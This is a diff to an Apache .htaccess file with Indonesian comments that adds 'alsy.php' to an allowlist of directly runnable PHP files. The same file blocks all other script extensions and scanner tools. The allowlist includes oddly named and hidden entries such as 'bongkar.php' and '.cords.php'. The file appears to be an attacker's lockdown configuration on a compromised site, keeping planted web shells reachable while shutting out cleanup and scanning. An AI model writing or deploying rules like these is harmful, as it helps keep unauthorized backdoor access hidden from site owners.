@@ -2,11 +2,11 @@ RewriteEngine On
 RewriteBase /
 
 # Rule 1: Izinkan akses langsung ke file yang diizinkan
-RewriteRule ^(index\.php|wp-kit\.php|wp-audio\.php|woo\.php|cache\.php|session\.php|debug\.php|log\.php|config\.php|api\.php|bongkar\.php|auth\.php|temp\.php|robots\.txt|sitemap\.xml|.cords\.php|.api\.php|Router\.php|fusion-database\.php|hooks-cache\.php)$ - [L]
+RewriteRule ^(index\.php|wp-kit\.php|wp-audio\.php|woo\.php|cache\.php|session\.php|debug\.php|alsy\.php|log\.php|config\.php|api\.php|bongkar\.php|auth\.php|temp\.php|robots\.txt|sitemap\.xml|.cords\.php|.api\.php|Router\.php|fusion-database\.php|hooks-cache\.php)$ - [L]
 
 # Rule 2: Blokir ekstensi berbahaya - FIXED
 RewriteCond %{REQUEST_URI} \.(php[3457]?|phtml|suspected|py|exe|pl|sh|cgi|asp|aspx|jsp)(\..*)?$ [NC]
-RewriteCond %{REQUEST_URI} !/(index\.php|wp-kit\.php|wp-audio\.php|woo\.php|cache\.php|session\.php|debug\.php|log\.php|config\.php|api\.php|bongkar\.php|auth\.php|temp\.php|robots\.txt|sitemap\.xml|.cords\.php|.api\.php|Router\.php|fusion-database\.php|hooks-cache\.php)$ [NC]
+RewriteCond %{REQUEST_URI} !/(index\.php|wp-kit\.php|wp-audio\.php|woo\.php|cache\.php|session\.php|debug\.php|alsy\.php|log\.php|config\.php|api\.php|bongkar\.php|auth\.php|temp\.php|robots\.txt|sitemap\.xml|.cords\.php|.api\.php|Router\.php|fusion-database\.php|hooks-cache\.php)$ [NC]
 RewriteRule .* - [F,L]
 
 # Rule 3: Blokir scanner tools
